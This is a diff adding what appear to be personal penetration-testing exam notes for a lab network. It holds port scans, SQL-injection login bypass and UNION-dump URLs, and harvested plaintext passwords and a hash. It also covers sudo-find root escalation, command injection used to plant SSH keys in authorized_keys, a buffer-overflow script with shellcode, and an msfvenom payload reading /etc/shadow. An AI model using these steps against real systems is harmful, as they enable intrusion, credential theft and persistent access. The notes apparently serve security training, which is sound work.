@@ -777,20 +777,132 @@ restart windows
 
 DRY RUN
 ______________________________________
+START
+10.50.43.80
+nmap -Pn -T4 --min-rate 65874654 10.51.43.80 -p20,21,22,2222,4444,4242,80,8080,3389
+22/tcp open ssh
+80/tcp open http
+--script http-enum.nse
+nikto -h 10.50.43.80
+
+
 when siging in with tom' or 1='1 it says welcome Aaron
-can upload files
+can upload files WHICH IS VULNERABLE TO DIRECTORY TRAVERSAL
   5 system_user=user2
   6 user_password=EaglesIsARE78
 192.168.28.181 WebApp
 
+--------- YOU MIGHT HAVE TO TYPE -sT with NMAP ---------
+
 http://127.0.0.1:1999/pick.php?product=7%20UNION%20select%20table_schema,column_name,5%20from%20information_schema.columns;#
+http://127.0.0.1:1999/pick.php?product=7%20UNION%20select%20table_schema,column_name,table_name%20from%20information_schema.columns;#
 http://127.0.0.1:1999/pick.php?product=7%20UNION%20select%20name,2,3%20from%20siteusers.users%20#
+PRODUCT=7 is the broken one
+The 3 defaults are information, performance, and mysql
+
+
 
 name  user_id            
 user3 Bob4THEEapples
 Aaron apasswordyPa$$word
 Lroth anotherpassword4THEages
 webuser *BF207353FF1EAA9EBA7DD87E37E6D278746F17CD
+
+When the web works off of integers do not use quotes
+
+Round sensor
+sudo -l
+sudo find . -exec /bin/sh \; -quit
+root>
+
+On the windows machine the 9999 port was open and you could use the python script (wim_buff.py)
+IF you cannot do the 9999 exploit, look for services and do a dll hijacking
+
+SQL INJECTION SQL INJECTION
+Think about the dry run
+
+=================== REVIEW ===================
+First thing to look for is robots.txt
+DO NOT WORRY ABOUT CROSS SITE SCRIPTING
+Command injecting, path, and uploads
+Testing for cmd injecting, using ; whoami
+find the users home directory if possible and throw ssh keygen into it
+Regen a new key for testing purposes with ssh-keygen -n 4096 
+DO NOT SHOW YOUR PRIVATES
+; mkdir /var/www/.ssh
+echo "public key" >> /var/www/.ssh/authorized_keys
+Upload a webshell to send an ssh-keygen
+If you get a WEBSHELL or a INJECTION send a keygen in
+You can only read through directory traversal
+linux buffer overflow
+if you find something like func it will be buffer overflow 
+scp uses -P, so scp the function that you will be overflowing
+gdb func
+pdisass main
+  ALWAYS ignore get_pc_thunk
+pdisass getuserinput
+  look up to see if gets is vulnerable on wiremask.eu
+go to wiremask.eu
+bufferoverflow pattern 
+vim lin_buff.py
+overflow = "Aa0..."
+print(overflow)
+
+open up the program in gdb again
+gdb func
+run <<< $(python lin_buff.py) 
+  take the hexadecimal value from the ip and input it into the register value 
+
+vim lin_buff.py
+overflow = "A" * 62
+eip = "B" * 4
+print(overflow + eip)
+
+env - gdb func
+show env
+unset env LINES
+unset env COLUMNS
+show env
+run
+  spam A for a while
+info proc map
+grab the start address under the heap, and the end address above the stack
+0xff,0xe4 will never change
+grab a random 5
+HAVE 5 JUST IN CASE ONE DOESN't WORK
+
+vim lin_buff.py
+overflow = "A" * 62
+eip = '\xef\x59\xf6\xf7'
+'''
+0xf7 f6 59 ef
+0xf7f662eb
+...
+'''
+
+nop = '\x90' * 10
+
+buf =  b""
+buf += b"\xdb\xcd\xbb\x4f\x38\x97\xf5\xd9\x74\x24\xf4\x5f"
+buf += b"\x2b\xc9\xb1\x0d\x31\x5f\x1a\x03\x5f\x1a\x83\xc7"
+buf += b"\x04\xe2\xba\x52\x9c\xad\xdd\xf1\xc4\x25\xf0\x96"
+buf += b"\x81\x51\x62\x76\xe1\xf5\x72\xe0\x2a\x64\x1b\x9e"
+buf += b"\xbd\x8b\x89\xb6\xae\x4b\x2d\x47\xac\x2a\x59\x67"
+buf += b"\x1d\xc8\xd5\x04\x4e\x61\x7d\xaa\xf4\xea\x0a\x2c"
+buf += b"\xa2\xa7\x7d\xcd\x81\xc8"
+
+
+print(overflow + eip + nop)
+end of vim
+
+msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b '\x00' -f python
+
+
+
+
+
+
+
 
 
 
